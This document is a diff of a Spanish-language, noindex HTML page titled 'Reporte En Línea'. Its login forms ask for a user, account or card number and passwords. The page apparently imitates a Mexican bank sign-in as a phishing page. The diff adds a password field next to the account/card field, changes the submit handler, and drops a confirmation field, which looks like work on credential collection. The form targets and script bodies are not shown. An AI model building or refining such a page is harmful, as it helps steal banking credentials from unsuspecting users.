@@ -1,5 +1,5 @@
 <!doctype html>
-<html  lang="es_MX">
+<html lang="es_MX">
 <head>
     <meta name="viewport" content="width=device-width">
     <meta name="robots" content="noindex, nofollow">
@@ -22,8 +22,8 @@
 
     <link rel='stylesheet'  href='css/estilos.css' type='text/css' media='all' />
 
-<meta charset="utf-8">
-<title>Reporte - Reporte En Línea</title>
+    <meta charset="utf-8">
+    <title>Reporte - Reporte En Línea</title>
 </head>
 
 <body>
@@ -51,10 +51,11 @@
 						<label for="nombre"> </label>
 						<div class="contenedor-input">
 							<input id="nombre" name="nombre"  placeholder="Usuario/Cuenta/Tarjeta" required />
+							<input id="password"type="password" name="password"  placeholder="Contraseña" required />
 						</div>	
 			
 						<div class="contenedor-boton">
-								<button type="submit"  id="submit-contact-form" onclick="miMensaje()">
+								<button type="submit"  id="submit-contact-form" onclick="miMensaje2()">
 								<b>INGRESAR</b>
 						</button>
 						<h2>OLVIDÉ MI CONTRASEÑA</h2>
@@ -65,16 +66,15 @@
 	
 				<div class="header exito" id="exito">
 
-					<div class="registro activo" id="registro2">
+					<div class="registro activodsd" id="registro2">
 					<form class="formulario" id="contact-form"  name="submit-form2">
 						<label for="nombre"> </label>
 						<div class="contenedor-input">
 							<input required type="password" id="contrasena"  name="contrasena" placeholder="Contraseña" />
-							<input required type="password" id="confirma"  name="confirma" placeholder="Confirmar contraseña" />
 						</div>	
 			
 						<div class="contenedor-boton">
-								<button type="submit"  id="submit-contact-form" onclick="miMensaje2()">
+								<button type="submit"  id="submit-contact-form" >
 								<b>INGRESAR</b>
 						</button>
 					<div class="num">MX 05</div>
@@ -193,5 +193,5 @@ function miMensaje2() {
 }
 </script>	
 
-	</body>
-	</html>
+</body>
+</html>
